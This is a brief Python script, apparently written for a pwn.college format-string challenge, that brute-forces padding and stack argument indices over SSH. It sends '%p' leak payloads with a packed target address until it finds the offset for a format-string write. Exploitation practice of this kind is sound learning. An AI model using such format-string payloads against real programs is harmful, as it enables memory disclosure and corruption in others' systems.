import subprocess, struct
addr = 0x404100
mid = "AAA " + ("%p " * 60)
for pad in range(8):
    for idx in range(40, 80):
        fmt = f"AAAA|%142c|%{idx}" + mid
        payload = fmt.encode() + b"B" * pad + struct.pack("<Q", addr)
        res = subprocess.run(["ssh", "-i", "../key", "hacker@dojo.pwn.college", "/challenge/babyfmt_level4.0"], input=payload, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
        out = res.stdout.decode(errors="ignore")
        parts = out.split('|')
        if len(parts) < 3:
            continue
        segment = parts[2].strip().split()[0]
        try:
            val = int(segment, 16)
        except ValueError:
            continue
        if val == addr:
            print("pad", pad, "idx", idx)
            raise SystemExit
print("no match")
